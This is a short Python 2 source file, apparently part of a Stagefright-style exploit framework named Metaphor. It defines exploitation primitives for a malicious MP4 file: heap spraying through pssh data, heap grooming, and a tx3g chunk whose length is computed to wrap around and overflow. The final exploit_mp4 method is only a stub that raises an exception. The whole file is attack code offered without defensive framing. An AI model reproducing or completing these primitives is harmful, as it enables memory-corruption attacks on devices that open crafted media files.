#!/usr/bin/python2
# -*- coding: utf-8 -*-

from metaphor_tools import *

class MetaphorBase(object):
    def __init__(self, config):
        self.config = config

    def heap_spray(self, payload):
        pssh = alloc_pssh_data(payload)
        
        return pssh
    
    def heap_shape(self):
        # Fill holes
        shape = heap_groom(self.config['fill_size'], self.config['groom_count'])

        return shape

    def tx3g_data(self):
        tx3g_data = pad(8)
        tx3g = chunk('tx3g', tx3g_data)

        return tx3g

    # Expects exact size parameters
    def tx3g_trigger(self, old_size, new_size):
        unsafe_length = (new_size - old_size) % (2 ** 64)
        tx3g_overflow = chunk('tx3g', '', length = unsafe_length)

        return tx3g_overflow

    def exploit_mp4(self):
        raise Exception('')
